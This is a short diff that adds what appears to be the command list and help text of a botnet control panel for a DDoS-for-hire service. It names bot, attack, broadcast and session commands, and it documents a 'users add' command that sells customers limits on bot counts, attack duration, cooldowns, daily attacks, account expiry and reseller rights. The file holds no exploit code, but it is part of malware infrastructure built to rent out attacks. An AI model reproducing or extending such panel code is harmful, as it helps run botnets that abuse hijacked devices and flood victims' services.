@@ -1,0 +1,32 @@
+ongoing
+bots
+?
+broadcast
+attacks
+users
+users add
+users remove
+users timeout
+sessions kick
+presets use
+passwd
+@
+
+
+
+Usage: users add <Username> <Password> [ options ]
+Example: users add newuser secretpass -1 60 100 100 1d false false
+
+Add argument documentation:
+   Username          -   The username of the new user
+   Password          -   The New_pass of the new user
+   Max Bots          -   The maximum number of devices the new user can access
+   Attack Duration   -   The maximum attack duration for the new user
+   Attack Cooldown   -   The cooldown between attacks for the new user
+   Max Daily Attacks -   The maximum number of attacks per day for the new user
+   Account Expiry    -   The time before the new user's account expires (e.g., 1d1w1m1s)
+   Admin Status      -   Is the new user an admin?
+   Reseller Status   -   Is the new user a reseller?
+
+Remove argument documentation:
+   Username          -   The user to remove
